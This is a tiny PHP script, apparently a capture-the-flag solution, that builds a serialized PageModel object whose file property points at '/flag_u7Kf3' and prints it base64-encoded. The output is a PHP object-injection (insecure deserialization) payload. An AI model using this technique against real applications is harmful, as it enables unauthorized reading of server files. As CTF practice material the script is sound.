<?php
	class PageModel{
		public $file;
	}
?>

<?php
$page = new PageModel;
$page->file = '/flag_u7Kf3';
print(base64_encode(serialize($page)))
?>
